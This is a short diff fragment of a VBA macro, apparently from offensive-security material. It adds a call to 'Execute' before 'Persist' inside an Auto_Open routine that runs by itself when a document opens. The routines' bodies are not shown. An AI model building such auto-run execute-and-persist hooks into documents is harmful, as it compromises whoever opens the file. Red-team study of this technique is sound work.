@@ -2,6 +2,7 @@
 ' Twitter: @enigma0x3
 
 Sub Auto_Open()
+Execute
 Persist
 
 End Sub
